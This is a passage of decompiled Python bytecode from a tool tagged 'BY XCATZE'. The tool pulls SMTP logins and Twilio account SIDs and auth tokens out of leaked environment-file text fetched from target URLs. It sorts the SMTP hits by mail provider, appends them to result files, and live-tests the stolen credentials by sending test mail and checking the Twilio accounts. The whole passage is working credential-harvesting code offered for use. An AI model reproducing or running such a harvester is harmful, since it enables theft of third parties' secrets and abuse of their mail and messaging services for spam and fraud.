              852  CALL_FUNCTION_0       0  ''
              854  LOAD_STR                 'on'
              856  COMPARE_OP               ==
          858_860  POP_JUMP_IF_FALSE   920  'to 920'

 L.1040       862  LOAD_GLOBAL              print
              864  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mmandrillapp\n'
              866  LOAD_METHOD              format
              868  LOAD_GLOBAL              str
              870  LOAD_FAST                'url'
              872  CALL_FUNCTION_1       1  ''
              874  CALL_METHOD_1         1  ''
              876  CALL_FUNCTION_1       1  ''
              878  POP_TOP          

 L.1041       880  LOAD_GLOBAL              open
              882  LOAD_STR                 'result/mandrill.txt'
              884  LOAD_STR                 'a'
              886  CALL_FUNCTION_2       2  ''
              888  STORE_FAST               'save'

 L.1042       890  LOAD_FAST                'save'
              892  LOAD_METHOD              write
              894  LOAD_GLOBAL              str
              896  LOAD_FAST                'remover'
              898  CALL_FUNCTION_1       1  ''
              900  LOAD_STR                 '\n\n'
              902  BINARY_ADD       
              904  CALL_METHOD_1         1  ''
              906  POP_TOP          

 L.1043       908  LOAD_FAST                'save'
              910  LOAD_METHOD              close
              912  CALL_METHOD_0         0  ''
              914  POP_TOP          
          916_918  JUMP_FORWARD       1684  'to 1684'
            920_0  COME_FROM           858  '858'
            920_1  COME_FROM           846  '846'

 L.1044       920  LOAD_STR                 'smtp-relay.gmail'
              922  LOAD_GLOBAL              str
              924  LOAD_FAST                'mailhost'
              926  CALL_FUNCTION_1       1  ''
              928  COMPARE_OP               in
          930_932  POP_JUMP_IF_FALSE  1004  'to 1004'
              934  LOAD_GLOBAL              relay
              936  CALL_FUNCTION_0       0  ''
              938  LOAD_STR                 'on'
              940  COMPARE_OP               ==
          942_944  POP_JUMP_IF_FALSE  1004  'to 1004'

 L.1045       946  LOAD_GLOBAL              print
              948  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mrelay\n'
              950  LOAD_METHOD              format
              952  LOAD_GLOBAL              str
              954  LOAD_FAST                'url'
              956  CALL_FUNCTION_1       1  ''
              958  CALL_METHOD_1         1  ''
              960  CALL_FUNCTION_1       1  ''
              962  POP_TOP          

 L.1046       964  LOAD_GLOBAL              open
              966  LOAD_STR                 'result/smtp-relay.txt'
              968  LOAD_STR                 'a'
              970  CALL_FUNCTION_2       2  ''
              972  STORE_FAST               'save'

 L.1047       974  LOAD_FAST                'save'
              976  LOAD_METHOD              write
              978  LOAD_GLOBAL              str
              980  LOAD_FAST                'remover'
              982  CALL_FUNCTION_1       1  ''
              984  LOAD_STR                 '\n\n'
              986  BINARY_ADD       
              988  CALL_METHOD_1         1  ''
              990  POP_TOP          

 L.1048       992  LOAD_FAST                'save'
              994  LOAD_METHOD              close
              996  CALL_METHOD_0         0  ''
              998  POP_TOP          
         1000_1002  JUMP_FORWARD       1684  'to 1684'
           1004_0  COME_FROM           942  '942'
           1004_1  COME_FROM           930  '930'

 L.1049      1004  LOAD_STR                 'sendinblue.com'
             1006  LOAD_GLOBAL              str
             1008  LOAD_FAST                'mailhost'
             1010  CALL_FUNCTION_1       1  ''
             1012  COMPARE_OP               in
         1014_1016  POP_JUMP_IF_FALSE  1088  'to 1088'
             1018  LOAD_GLOBAL              sendinblue
             1020  CALL_FUNCTION_0       0  ''
             1022  LOAD_STR                 'on'
             1024  COMPARE_OP               ==
         1026_1028  POP_JUMP_IF_FALSE  1088  'to 1088'

 L.1050      1030  LOAD_GLOBAL              print
             1032  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40msendinblue\n'
             1034  LOAD_METHOD              format
             1036  LOAD_GLOBAL              str
             1038  LOAD_FAST                'url'
             1040  CALL_FUNCTION_1       1  ''
             1042  CALL_METHOD_1         1  ''
             1044  CALL_FUNCTION_1       1  ''
             1046  POP_TOP          

 L.1051      1048  LOAD_GLOBAL              open
             1050  LOAD_STR                 'result/sendinblue.txt'
             1052  LOAD_STR                 'a'
             1054  CALL_FUNCTION_2       2  ''
             1056  STORE_FAST               'save'

 L.1052      1058  LOAD_FAST                'save'
             1060  LOAD_METHOD              write
             1062  LOAD_GLOBAL              str
             1064  LOAD_FAST                'remover'
             1066  CALL_FUNCTION_1       1  ''
             1068  LOAD_STR                 '\n\n'
             1070  BINARY_ADD       
             1072  CALL_METHOD_1         1  ''
             1074  POP_TOP          

 L.1053      1076  LOAD_FAST                'save'
             1078  LOAD_METHOD              close
             1080  CALL_METHOD_0         0  ''
             1082  POP_TOP          
         1084_1086  JUMP_FORWARD       1684  'to 1684'
           1088_0  COME_FROM          1026  '1026'
           1088_1  COME_FROM          1014  '1014'

 L.1054      1088  LOAD_STR                 'kasserver.com'
             1090  LOAD_GLOBAL              str
             1092  LOAD_FAST                'mailhost'
             1094  CALL_FUNCTION_1       1  ''
             1096  COMPARE_OP               in
         1098_1100  POP_JUMP_IF_FALSE  1160  'to 1160'

 L.1055      1102  LOAD_GLOBAL              print
             1104  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40msendinblue\n'
             1106  LOAD_METHOD              format
             1108  LOAD_GLOBAL              str
             1110  LOAD_FAST                'url'
             1112  CALL_FUNCTION_1       1  ''
             1114  CALL_METHOD_1         1  ''
             1116  CALL_FUNCTION_1       1  ''
             1118  POP_TOP          

 L.1056      1120  LOAD_GLOBAL              open
             1122  LOAD_STR                 'result/kasserver.txt'
             1124  LOAD_STR                 'a'
             1126  CALL_FUNCTION_2       2  ''
             1128  STORE_FAST               'save'

 L.1057      1130  LOAD_FAST                'save'
             1132  LOAD_METHOD              write
             1134  LOAD_GLOBAL              str
             1136  LOAD_FAST                'remover'
             1138  CALL_FUNCTION_1       1  ''
             1140  LOAD_STR                 '\n\n'
             1142  BINARY_ADD       
             1144  CALL_METHOD_1         1  ''
             1146  POP_TOP          

 L.1058      1148  LOAD_FAST                'save'
             1150  LOAD_METHOD              close
             1152  CALL_METHOD_0         0  ''
             1154  POP_TOP          
         1156_1158  JUMP_FORWARD       1684  'to 1684'
           1160_0  COME_FROM          1098  '1098'

 L.1059      1160  LOAD_STR                 'zoho.'
             1162  LOAD_GLOBAL              str
             1164  LOAD_FAST                'mailhost'
             1166  CALL_FUNCTION_1       1  ''
             1168  COMPARE_OP               in
         1170_1172  POP_JUMP_IF_FALSE  1244  'to 1244'
             1174  LOAD_GLOBAL              zoho
             1176  CALL_FUNCTION_0       0  ''
             1178  LOAD_STR                 'on'
             1180  COMPARE_OP               ==
         1182_1184  POP_JUMP_IF_FALSE  1244  'to 1244'

 L.1060      1186  LOAD_GLOBAL              print
             1188  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mzoho\n'
             1190  LOAD_METHOD              format
             1192  LOAD_GLOBAL              str
             1194  LOAD_FAST                'url'
             1196  CALL_FUNCTION_1       1  ''
             1198  CALL_METHOD_1         1  ''
             1200  CALL_FUNCTION_1       1  ''
             1202  POP_TOP          

 L.1061      1204  LOAD_GLOBAL              open
             1206  LOAD_STR                 'result/zoho.txt'
             1208  LOAD_STR                 'a'
             1210  CALL_FUNCTION_2       2  ''
             1212  STORE_FAST               'save'

 L.1062      1214  LOAD_FAST                'save'
             1216  LOAD_METHOD              write
             1218  LOAD_GLOBAL              str
             1220  LOAD_FAST                'remover'
             1222  CALL_FUNCTION_1       1  ''
             1224  LOAD_STR                 '\n\n'
             1226  BINARY_ADD       
             1228  CALL_METHOD_1         1  ''
             1230  POP_TOP          

 L.1063      1232  LOAD_FAST                'save'
             1234  LOAD_METHOD              close
             1236  CALL_METHOD_0         0  ''
             1238  POP_TOP          
         1240_1242  JUMP_FORWARD       1684  'to 1684'
           1244_0  COME_FROM          1182  '1182'
           1244_1  COME_FROM          1170  '1170'

 L.1064      1244  LOAD_STR                 '1and1.'
             1246  LOAD_GLOBAL              str
             1248  LOAD_FAST                'mailhost'
             1250  CALL_FUNCTION_1       1  ''
             1252  COMPARE_OP               in
         1254_1256  POP_JUMP_IF_FALSE  1328  'to 1328'
             1258  LOAD_GLOBAL              and1
             1260  CALL_FUNCTION_0       0  ''
             1262  LOAD_STR                 'on'
             1264  COMPARE_OP               ==
         1266_1268  POP_JUMP_IF_FALSE  1328  'to 1328'

 L.1065      1270  LOAD_GLOBAL              print
             1272  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40m1and1\n'
             1274  LOAD_METHOD              format
             1276  LOAD_GLOBAL              str
             1278  LOAD_FAST                'url'
             1280  CALL_FUNCTION_1       1  ''
             1282  CALL_METHOD_1         1  ''
             1284  CALL_FUNCTION_1       1  ''
             1286  POP_TOP          

 L.1066      1288  LOAD_GLOBAL              open
             1290  LOAD_STR                 'result/1and1.txt'
             1292  LOAD_STR                 'a'
             1294  CALL_FUNCTION_2       2  ''
             1296  STORE_FAST               'save'

 L.1067      1298  LOAD_FAST                'save'
             1300  LOAD_METHOD              write
             1302  LOAD_GLOBAL              str
             1304  LOAD_FAST                'remover'
             1306  CALL_FUNCTION_1       1  ''
             1308  LOAD_STR                 '\n\n'
             1310  BINARY_ADD       
             1312  CALL_METHOD_1         1  ''
             1314  POP_TOP          

 L.1068      1316  LOAD_FAST                'save'
             1318  LOAD_METHOD              close
             1320  CALL_METHOD_0         0  ''
             1322  POP_TOP          
         1324_1326  JUMP_FORWARD       1684  'to 1684'
           1328_0  COME_FROM          1266  '1266'
           1328_1  COME_FROM          1254  '1254'

 L.1069      1328  LOAD_FAST                'mailhost'
             1330  LOAD_STR                 'smtp.office365.com'
             1332  COMPARE_OP               ==
         1334_1336  POP_JUMP_IF_FALSE  1408  'to 1408'
             1338  LOAD_GLOBAL              office365
             1340  CALL_FUNCTION_0       0  ''
             1342  LOAD_STR                 'on'
             1344  COMPARE_OP               ==
         1346_1348  POP_JUMP_IF_FALSE  1408  'to 1408'

 L.1070      1350  LOAD_GLOBAL              print
             1352  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40moffice365\n'
             1354  LOAD_METHOD              format
             1356  LOAD_GLOBAL              str
             1358  LOAD_FAST                'url'
             1360  CALL_FUNCTION_1       1  ''
             1362  CALL_METHOD_1         1  ''
             1364  CALL_FUNCTION_1       1  ''
             1366  POP_TOP          

 L.1071      1368  LOAD_GLOBAL              open
             1370  LOAD_STR                 'result/office365.txt'
             1372  LOAD_STR                 'a'
             1374  CALL_FUNCTION_2       2  ''
             1376  STORE_FAST               'save'

 L.1072      1378  LOAD_FAST                'save'
             1380  LOAD_METHOD              write
             1382  LOAD_GLOBAL              str
             1384  LOAD_FAST                'remover'
             1386  CALL_FUNCTION_1       1  ''
             1388  LOAD_STR                 '\n\n'
             1390  BINARY_ADD       
             1392  CALL_METHOD_1         1  ''
             1394  POP_TOP          

 L.1073      1396  LOAD_FAST                'save'
             1398  LOAD_METHOD              close
             1400  CALL_METHOD_0         0  ''
             1402  POP_TOP          
         1404_1406  JUMP_FORWARD       1684  'to 1684'
           1408_0  COME_FROM          1346  '1346'
           1408_1  COME_FROM          1334  '1334'

 L.1074      1408  LOAD_STR                 'zimbra'
             1410  LOAD_GLOBAL              str
             1412  LOAD_FAST                'mailhost'
             1414  CALL_FUNCTION_1       1  ''
             1416  COMPARE_OP               in
         1418_1420  POP_JUMP_IF_FALSE  1490  'to 1490'
             1422  LOAD_GLOBAL              zimbra
             1424  CALL_FUNCTION_0       0  ''
             1426  LOAD_STR                 'on'
             1428  COMPARE_OP               ==
         1430_1432  POP_JUMP_IF_FALSE  1490  'to 1490'

 L.1075      1434  LOAD_GLOBAL              print
             1436  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mZimbra\n'
             1438  LOAD_METHOD              format
             1440  LOAD_GLOBAL              str
             1442  LOAD_FAST                'url'
             1444  CALL_FUNCTION_1       1  ''
             1446  CALL_METHOD_1         1  ''
             1448  CALL_FUNCTION_1       1  ''
             1450  POP_TOP          

 L.1076      1452  LOAD_GLOBAL              open
             1454  LOAD_STR                 'result/zimbra.txt'
             1456  LOAD_STR                 'a'
             1458  CALL_FUNCTION_2       2  ''
             1460  STORE_FAST               'save'

 L.1077      1462  LOAD_FAST                'save'
             1464  LOAD_METHOD              write
             1466  LOAD_GLOBAL              str
             1468  LOAD_FAST                'remover'
             1470  CALL_FUNCTION_1       1  ''
             1472  LOAD_STR                 '\n\n'
             1474  BINARY_ADD       
             1476  CALL_METHOD_1         1  ''
             1478  POP_TOP          

 L.1078      1480  LOAD_FAST                'save'
             1482  LOAD_METHOD              close
             1484  CALL_METHOD_0         0  ''
             1486  POP_TOP          
             1488  JUMP_FORWARD       1684  'to 1684'
           1490_0  COME_FROM          1430  '1430'
           1490_1  COME_FROM          1418  '1418'

 L.1079      1490  LOAD_FAST                'mailuser'
             1492  LOAD_STR                 'null'
             1494  COMPARE_OP               !=
         1496_1498  POP_JUMP_IF_FALSE  1520  'to 1520'
             1500  LOAD_FAST                'mailpass'
             1502  LOAD_STR                 'null'
             1504  COMPARE_OP               !=
         1506_1508  POP_JUMP_IF_FALSE  1520  'to 1520'
             1510  LOAD_FAST                'mailhost'
             1512  LOAD_STR                 'smtp.mailtrap.io'
             1514  COMPARE_OP               !=
         1516_1518  POP_JUMP_IF_TRUE   1560  'to 1560'
           1520_0  COME_FROM          1506  '1506'
           1520_1  COME_FROM          1496  '1496'
             1520  LOAD_FAST                'mailuser'
             1522  LOAD_STR                 ''
             1524  COMPARE_OP               !=
         1526_1528  POP_JUMP_IF_FALSE  1550  'to 1550'
             1530  LOAD_FAST                'mailpass'
             1532  LOAD_STR                 ''
             1534  COMPARE_OP               !=
         1536_1538  POP_JUMP_IF_FALSE  1550  'to 1550'
             1540  LOAD_FAST                'mailhost'
             1542  LOAD_STR                 'smtp.mailtrap.io'
             1544  COMPARE_OP               !=
         1546_1548  POP_JUMP_IF_TRUE   1560  'to 1560'
           1550_0  COME_FROM          1536  '1536'
           1550_1  COME_FROM          1526  '1526'
             1550  LOAD_FAST                'mailhost'
             1552  LOAD_STR                 'smtp.mailtrap.io'
             1554  COMPARE_OP               !=
         1556_1558  POP_JUMP_IF_FALSE  1616  'to 1616'
           1560_0  COME_FROM          1546  '1546'
           1560_1  COME_FROM          1516  '1516'

 L.1080      1560  LOAD_GLOBAL              print
             1562  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mSMTP Random\n'
             1564  LOAD_METHOD              format
             1566  LOAD_GLOBAL              str
             1568  LOAD_FAST                'url'
             1570  CALL_FUNCTION_1       1  ''
             1572  CALL_METHOD_1         1  ''
             1574  CALL_FUNCTION_1       1  ''
             1576  POP_TOP          

 L.1081      1578  LOAD_GLOBAL              open
             1580  LOAD_STR                 'result/SMTP_RANDOM.txt'
             1582  LOAD_STR                 'a'
             1584  CALL_FUNCTION_2       2  ''
             1586  STORE_FAST               'save'

 L.1082      1588  LOAD_FAST                'save'
             1590  LOAD_METHOD              write
             1592  LOAD_GLOBAL              str
             1594  LOAD_FAST                'remover'
             1596  CALL_FUNCTION_1       1  ''
             1598  LOAD_STR                 '\n\n'
             1600  BINARY_ADD       
             1602  CALL_METHOD_1         1  ''
             1604  POP_TOP          

 L.1083      1606  LOAD_FAST                'save'
             1608  LOAD_METHOD              close
             1610  CALL_METHOD_0         0  ''
             1612  POP_TOP          
             1614  JUMP_FORWARD       1684  'to 1684'
           1616_0  COME_FROM          1556  '1556'

 L.1084      1616  LOAD_FAST                'mailuser'
             1618  LOAD_STR                 'null'
             1620  COMPARE_OP               ==
         1622_1624  POP_JUMP_IF_TRUE   1666  'to 1666'
             1626  LOAD_FAST                'mailpass'
             1628  LOAD_STR                 'null'
             1630  COMPARE_OP               ==
         1632_1634  POP_JUMP_IF_TRUE   1666  'to 1666'
             1636  LOAD_FAST                'mailuser'
             1638  LOAD_STR                 ''
             1640  COMPARE_OP               ==
         1642_1644  POP_JUMP_IF_TRUE   1666  'to 1666'
             1646  LOAD_FAST                'mailpass'
             1648  LOAD_STR                 ''
           1650_0  COME_FROM           548  '548'
             1650  COMPARE_OP               ==
         1652_1654  POP_JUMP_IF_TRUE   1666  'to 1666'
             1656  LOAD_FAST                'mailhost'
             1658  LOAD_STR                 'smtp.mailtrap.io'
             1660  COMPARE_OP               ==
         1662_1664  POP_JUMP_IF_FALSE  1684  'to 1684'
           1666_0  COME_FROM          1652  '1652'
           1666_1  COME_FROM          1642  '1642'
           1666_2  COME_FROM          1632  '1632'
           1666_3  COME_FROM          1622  '1622'

 L.1085      1666  LOAD_GLOBAL              print
             1668  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;31;40mInvalid SMTP\n'
             1670  LOAD_METHOD              format
             1672  LOAD_GLOBAL              str
             1674  LOAD_FAST                'url'
             1676  CALL_FUNCTION_1       1  ''
           1678_0  COME_FROM           576  '576'
             1678  CALL_METHOD_1         1  ''
             1680  CALL_FUNCTION_1       1  ''
             1682  POP_TOP          
           1684_0  COME_FROM          1662  '1662'
           1684_1  COME_FROM          1614  '1614'
           1684_2  COME_FROM          1488  '1488'
           1684_3  COME_FROM          1404  '1404'
           1684_4  COME_FROM          1324  '1324'
           1684_5  COME_FROM          1240  '1240'
           1684_6  COME_FROM          1156  '1156'
           1684_7  COME_FROM          1084  '1084'
           1684_8  COME_FROM          1000  '1000'
           1684_9  COME_FROM           916  '916'
          1684_10  COME_FROM           832  '832'
          1684_11  COME_FROM           748  '748'
          1684_12  COME_FROM           664  '664'
          1684_13  COME_FROM           580  '580'

 L.1086      1684  SETUP_FINALLY      1708  'to 1708'

 L.1087      1686  LOAD_GLOBAL              sendtest
             1688  LOAD_FAST                'url'
             1690  LOAD_FAST                'mailhost'
             1692  LOAD_FAST                'mailport'
             1694  LOAD_FAST                'mailuser'
             1696  LOAD_FAST                'mailpass'
             1698  LOAD_FAST                'mailfrom'
             1700  CALL_FUNCTION_6       6  ''
             1702  POP_TOP          
             1704  POP_BLOCK        
             1706  JUMP_FORWARD       1738  'to 1738'
           1708_0  COME_FROM_FINALLY  1684  '1684'

 L.1088      1708  POP_TOP          
             1710  POP_TOP          
             1712  POP_TOP          

 L.1089      1714  LOAD_GLOBAL              print
             1716  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;31;40mFailed Send\n'
             1718  LOAD_METHOD              format
             1720  LOAD_GLOBAL              str
             1722  LOAD_FAST                'url'
             1724  CALL_FUNCTION_1       1  ''
             1726  CALL_METHOD_1         1  ''
             1728  CALL_FUNCTION_1       1  ''
             1730  POP_TOP          
             1732  POP_EXCEPT       
             1734  JUMP_FORWARD       1738  'to 1738'
             1736  END_FINALLY      
           1738_0  COME_FROM          1734  '1734'
           1738_1  COME_FROM          1706  '1706'
             1738  JUMP_FORWARD       1758  'to 1758'
           1740_0  COME_FROM            10  '10'

 L.1091      1740  LOAD_GLOBAL              print
             1742  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;31;40mFailed SMTP\n'
             1744  LOAD_METHOD              format
             1746  LOAD_GLOBAL              str
             1748  LOAD_FAST                'url'
             1750  CALL_FUNCTION_1       1  ''
             1752  CALL_METHOD_1         1  ''
             1754  CALL_FUNCTION_1       1  ''
             1756  POP_TOP          
           1758_0  COME_FROM          1738  '1738'
           1758_1  COME_FROM            20  '20'

 L.1095      1758  LOAD_STR                 'TWILIO_ACCOUNT_SID='
             1760  LOAD_FAST                'text'
             1762  COMPARE_OP               in
         1764_1766  POP_JUMP_IF_FALSE  1986  'to 1986'
             1768  LOAD_GLOBAL              twillio
             1770  CALL_FUNCTION_0       0  ''
             1772  LOAD_STR                 'on'
             1774  COMPARE_OP               ==
         1776_1778  POP_JUMP_IF_FALSE  1986  'to 1986'

 L.1096      1780  LOAD_GLOBAL              reg
             1782  LOAD_STR                 '\nTWILIO_ACCOUNT_SID=(.*?)\n'
             1784  LOAD_FAST                'text'
             1786  CALL_FUNCTION_2       2  ''
             1788  LOAD_CONST               0
             1790  BINARY_SUBSCR    
             1792  STORE_FAST               'acc_sid'

 L.1097      1794  SETUP_FINALLY      1814  'to 1814'

 L.1098      1796  LOAD_GLOBAL              reg
             1798  LOAD_STR                 '\nTWILIO_NUMBER=(.*?)\n'
             1800  LOAD_FAST                'text'
             1802  CALL_FUNCTION_2       2  ''
             1804  LOAD_CONST               0
             1806  BINARY_SUBSCR    
             1808  STORE_FAST               'phone'
             1810  POP_BLOCK        
             1812  JUMP_FORWARD       1830  'to 1830'
           1814_0  COME_FROM_FINALLY  1794  '1794'

 L.1099      1814  POP_TOP          
             1816  POP_TOP          
             1818  POP_TOP          

 L.1100      1820  LOAD_STR                 ''
             1822  STORE_FAST               'phone'
             1824  POP_EXCEPT       
             1826  JUMP_FORWARD       1830  'to 1830'
             1828  END_FINALLY      
           1830_0  COME_FROM          1826  '1826'
           1830_1  COME_FROM          1812  '1812'

 L.1101      1830  LOAD_GLOBAL              reg
             1832  LOAD_STR                 '\nTWILIO_AUTH_TOKEN=(.*?)\n'
             1834  LOAD_FAST                'text'
             1836  CALL_FUNCTION_2       2  ''
             1838  LOAD_CONST               0
             1840  BINARY_SUBSCR    
             1842  STORE_FAST               'auhtoken'

 L.1103      1844  LOAD_STR                 'URL: '
             1846  LOAD_FAST                'url'
             1848  BINARY_ADD       
             1850  LOAD_STR                 '\nTWILIO_ACCOUNT_SID: '
             1852  BINARY_ADD       
             1854  LOAD_GLOBAL              str
             1856  LOAD_FAST                'acc_sid'
             1858  CALL_FUNCTION_1       1  ''
             1860  BINARY_ADD       
             1862  LOAD_STR                 '\nTWILIO_NUMBER: '
             1864  BINARY_ADD       
             1866  LOAD_GLOBAL              str
             1868  LOAD_FAST                'phone'
             1870  CALL_FUNCTION_1       1  ''
             1872  BINARY_ADD       
             1874  LOAD_STR                 '\nTWILIO_AUTH_TOKEN: '
             1876  BINARY_ADD       
             1878  LOAD_GLOBAL              str
             1880  LOAD_FAST                'auhtoken'
             1882  CALL_FUNCTION_1       1  ''
             1884  BINARY_ADD       
             1886  STORE_FAST               'build'

 L.1104      1888  LOAD_GLOBAL              str
             1890  LOAD_FAST                'build'
             1892  CALL_FUNCTION_1       1  ''
             1894  LOAD_METHOD              replace
             1896  LOAD_STR                 '\r'
             1898  LOAD_STR                 ''
             1900  CALL_METHOD_2         2  ''
             1902  STORE_FAST               'remover'

 L.1105      1904  LOAD_GLOBAL              open
             1906  LOAD_STR                 'result/twillio.txt'
             1908  LOAD_STR                 'a'
             1910  CALL_FUNCTION_2       2  ''
             1912  STORE_FAST               'save'

 L.1106      1914  LOAD_FAST                'save'
             1916  LOAD_METHOD              write
             1918  LOAD_FAST                'remover'
             1920  LOAD_STR                 '\n\n'
             1922  BINARY_ADD       
             1924  CALL_METHOD_1         1  ''
             1926  POP_TOP          

 L.1107      1928  LOAD_FAST                'save'
             1930  LOAD_METHOD              close
             1932  CALL_METHOD_0         0  ''
             1934  POP_TOP          

 L.1108      1936  SETUP_FINALLY      1956  'to 1956'

 L.1109      1938  LOAD_GLOBAL              twilliocheck
             1940  LOAD_FAST                'url'
             1942  LOAD_FAST                'acc_sid'
             1944  LOAD_FAST                'auhtoken'
             1946  LOAD_FAST                'phone'
             1948  CALL_FUNCTION_4       4  ''
             1950  POP_TOP          
             1952  POP_BLOCK        
             1954  JUMP_FORWARD       2444  'to 2444'
           1956_0  COME_FROM_FINALLY  1936  '1936'

 L.1110      1956  POP_TOP          
             1958  POP_TOP          
             1960  POP_TOP          

 L.1111      1962  LOAD_GLOBAL              print
             1964  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mInvalid Twillio\n'
             1966  LOAD_METHOD              format
             1968  LOAD_FAST                'url'
             1970  CALL_METHOD_1         1  ''
             1972  CALL_FUNCTION_1       1  ''
             1974  POP_TOP          
             1976  POP_EXCEPT       
             1978  JUMP_FORWARD       2444  'to 2444'
             1980  END_FINALLY      
         1982_1984  JUMP_FORWARD       2444  'to 2444'
           1986_0  COME_FROM          1776  '1776'
           1986_1  COME_FROM          1764  '1764'

 L.1112      1986  LOAD_STR                 'TWILIO_SID='
             1988  LOAD_FAST                'text'
             1990  COMPARE_OP               in
         1992_1994  POP_JUMP_IF_FALSE  2216  'to 2216'
             1996  LOAD_GLOBAL              twillio
             1998  CALL_FUNCTION_0       0  ''
             2000  LOAD_STR                 'on'
             2002  COMPARE_OP               ==
         2004_2006  POP_JUMP_IF_FALSE  2216  'to 2216'

 L.1113      2008  LOAD_GLOBAL              reg
             2010  LOAD_STR                 '\nTWILIO_SID=(.*?)\n'
             2012  LOAD_FAST                'text'
             2014  CALL_FUNCTION_2       2  ''
             2016  LOAD_CONST               0
             2018  BINARY_SUBSCR    
             2020  STORE_FAST               'acc_sid'

 L.1114      2022  LOAD_GLOBAL              reg
             2024  LOAD_STR                 '\nTWILIO_TOKEN=(.*?)\n'
             2026  LOAD_FAST                'text'
             2028  CALL_FUNCTION_2       2  ''
             2030  LOAD_CONST               0
             2032  BINARY_SUBSCR    
             2034  STORE_FAST               'acc_key'

 L.1115      2036  SETUP_FINALLY      2056  'to 2056'

 L.1116      2038  LOAD_GLOBAL              reg
             2040  LOAD_STR                 '\nTWILIO_FROM=(.*?)\n'
             2042  LOAD_FAST                'text'
             2044  CALL_FUNCTION_2       2  ''
             2046  LOAD_CONST               0
             2048  BINARY_SUBSCR    
             2050  STORE_FAST               'acc_from'
             2052  POP_BLOCK        
             2054  JUMP_FORWARD       2072  'to 2072'
           2056_0  COME_FROM_FINALLY  2036  '2036'

 L.1117      2056  POP_TOP          
             2058  POP_TOP          
             2060  POP_TOP          

 L.1118      2062  LOAD_STR                 ''
             2064  STORE_FAST               'acc_from'
             2066  POP_EXCEPT       
             2068  JUMP_FORWARD       2072  'to 2072'
             2070  END_FINALLY      
           2072_0  COME_FROM          2068  '2068'
           2072_1  COME_FROM          2054  '2054'

 L.1120      2072  LOAD_STR                 'URL: '
             2074  LOAD_GLOBAL              str
             2076  LOAD_FAST                'url'
             2078  CALL_FUNCTION_1       1  ''
             2080  BINARY_ADD       
             2082  LOAD_STR                 '\nTWILIO_SID: '
             2084  BINARY_ADD       
             2086  LOAD_GLOBAL              str
             2088  LOAD_FAST                'acc_sid'
             2090  CALL_FUNCTION_1       1  ''
             2092  BINARY_ADD       
             2094  LOAD_STR                 '\nTWILIO_TOKEN: '
             2096  BINARY_ADD       
             2098  LOAD_GLOBAL              str
             2100  LOAD_FAST                'acc_key'
             2102  CALL_FUNCTION_1       1  ''
             2104  BINARY_ADD       
             2106  LOAD_STR                 '\nTWILIO_FROM: '
             2108  BINARY_ADD       
             2110  LOAD_GLOBAL              str
             2112  LOAD_FAST                'acc_from'
             2114  CALL_FUNCTION_1       1  ''
             2116  BINARY_ADD       
             2118  STORE_FAST               'build'

 L.1121      2120  LOAD_GLOBAL              str
             2122  LOAD_FAST                'build'
             2124  CALL_FUNCTION_1       1  ''
             2126  LOAD_METHOD              replace
             2128  LOAD_STR                 '\r'
             2130  LOAD_STR                 ''
             2132  CALL_METHOD_2         2  ''
             2134  STORE_FAST               'remover'

 L.1122      2136  LOAD_GLOBAL              open
             2138  LOAD_STR                 'result/twillio.txt'
             2140  LOAD_STR                 'a'
             2142  CALL_FUNCTION_2       2  ''
             2144  STORE_FAST               'save'

 L.1123      2146  LOAD_FAST                'save'
             2148  LOAD_METHOD              write
             2150  LOAD_FAST                'remover'
             2152  LOAD_STR                 '\n\n'
             2154  BINARY_ADD       
             2156  CALL_METHOD_1         1  ''
             2158  POP_TOP          

 L.1124      2160  LOAD_FAST                'save'
             2162  LOAD_METHOD              close
             2164  CALL_METHOD_0         0  ''
             2166  POP_TOP          

 L.1125      2168  SETUP_FINALLY      2188  'to 2188'

 L.1126      2170  LOAD_GLOBAL              twilliocheck
             2172  LOAD_FAST                'url'
             2174  LOAD_FAST                'acc_sid'
             2176  LOAD_FAST                'auhtoken'
             2178  LOAD_FAST                'phone'
             2180  CALL_FUNCTION_4       4  ''
             2182  POP_TOP          
             2184  POP_BLOCK        
             2186  JUMP_FORWARD       2214  'to 2214'
           2188_0  COME_FROM_FINALLY  2168  '2168'

 L.1127      2188  POP_TOP          
             2190  POP_TOP          
             2192  POP_TOP          

 L.1128      2194  LOAD_GLOBAL              print
             2196  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mInvalid Twillio\n'
             2198  LOAD_METHOD              format
             2200  LOAD_FAST                'url'
             2202  CALL_METHOD_1         1  ''
             2204  CALL_FUNCTION_1       1  ''
             2206  POP_TOP          
             2208  POP_EXCEPT       
             2210  JUMP_FORWARD       2214  'to 2214'
             2212  END_FINALLY      
           2214_0  COME_FROM          2210  '2210'
           2214_1  COME_FROM          2186  '2186'
             2214  JUMP_FORWARD       2444  'to 2444'
           2216_0  COME_FROM          2004  '2004'
           2216_1  COME_FROM          1992  '1992'

 L.1129      2216  LOAD_STR                 'ACCOUNT_SID='
             2218  LOAD_FAST                'text'
             2220  COMPARE_OP               in
         2222_2224  POP_JUMP_IF_FALSE  2444  'to 2444'
             2226  LOAD_GLOBAL              twillio
             2228  CALL_FUNCTION_0       0  ''
             2230  LOAD_STR                 'on'
             2232  COMPARE_OP               ==
         2234_2236  POP_JUMP_IF_FALSE  2444  'to 2444'

 L.1130      2238  LOAD_GLOBAL              reg
             2240  LOAD_STR                 '\nACCOUNT_SID=(.*?)\n'
             2242  LOAD_FAST                'text'
             2244  CALL_FUNCTION_2       2  ''
             2246  LOAD_CONST               0
             2248  BINARY_SUBSCR    
             2250  STORE_FAST               'acc_sid'

 L.1131      2252  LOAD_GLOBAL              reg
             2254  LOAD_STR                 '\nAUTH_TOKEN=(.*?)\n'
             2256  LOAD_FAST                'text'
